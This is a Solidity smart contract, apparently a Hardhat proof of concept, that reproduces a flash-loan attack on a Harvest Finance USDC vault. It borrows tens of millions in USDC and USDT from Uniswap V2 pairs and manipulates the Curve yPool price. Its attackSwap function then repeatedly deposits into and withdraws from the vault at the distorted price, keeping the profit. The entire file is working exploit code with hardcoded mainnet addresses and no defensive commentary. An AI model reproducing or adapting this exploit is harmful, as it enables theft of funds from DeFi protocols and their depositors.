pragma solidity ^0.7.0;

import "./Icurve-yswap.sol";
import "./IHarvestUsdcVault.sol";
import "./IUniswapV2Interfaces.sol";
import "./IUniswapV2Router02.sol";
import "./IYERC20.sol";
import "./IERC20USDT.sol";
import "hardhat/console.sol";

contract Expolit{

    IUniswapV2Pair usdcPair = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    IUniswapV2Pair usdtPair = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    IcurveYSwap yswap = IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    // IUniswapV2Router02 router = IUniswapV2Router02();
    IHarvestUsdcVault harvest = IHarvestUsdcVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
    IERC20USDT usdt = IERC20USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 fusdc = IERC20(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
    IERC20 yusdt = IERC20(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);
    IERC20 yusdc = IERC20(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e);

    uint usdcLoan = 50000000*10**6;
    uint usdtLoan = 17300000*10**6;
    uint usdcRepayment = (usdcLoan * 100301) / 100000;
    uint usdtRepayment = (usdtLoan * 100301) / 100000;

    constructor() public {
        usdc.approve(address(usdcPair),uint(-1));
        usdc.approve(address(harvest),uint(-1));
        usdc.approve(address(yswap),uint(-1));
        usdt.approve(address(usdtPair),uint(-1));
        usdt.approve(address(yswap),uint(-1));
    }

    function start() public {

        console.log("----------Start---------");
        uint initusdtBalance = usdt.balanceOf(address(this));
        uint initusdcBalance = usdc.balanceOf(address(this));
        console.log("USDC init balance",initusdcBalance / 10**6);
        console.log("USDT init balance",initusdtBalance / 10**6);

        console.log("flashloan USDC");
        usdcPair.swap(usdcLoan,0,address(this),"0x");

        usdc.approve(address(usdcPair),0);
        usdt.approve(address(usdtPair),0);

        uint lastusdcBalance = usdc.balanceOf(address(this));
        uint lastusdtBalance = usdt.balanceOf(address(this));

        console.log("----------Profit---------");
        console.log("USDC balance",lastusdcBalance / 10**6);
        console.log("USDT balance",lastusdtBalance / 10**6);
        
    }

    function uniswapV2Call(address,uint,uint,bytes calldata) external {
        if (msg.sender == address(usdcPair)) {
            console.log("flashloan USDT");
            usdtPair.swap(0,usdtLoan,address(this),"0x");
            usdc.transfer(address(usdcPair),usdcRepayment);
            console.log("repay USDC");
        }

        if (msg.sender == address(usdtPair)) {

            for (uint i = 0;i < 6; i++){
                attackSwap();
            }
            usdt.transfer(address(usdtPair),usdtRepayment);
            console.log("repay USDT");
        }
    }
    
    function attackSwap() internal {
        yswap.exchange_underlying(2,1,17200000*10**6,17000000*10**6);
        harvest.deposit(49000000000000);
        yswap.exchange_underlying(1,2,17310000*10**6,17000000*10**6);
        harvest.withdraw(fusdc.balanceOf(address(this)));
        console.log("attack swap");
    }

    receive() external payable{ }

}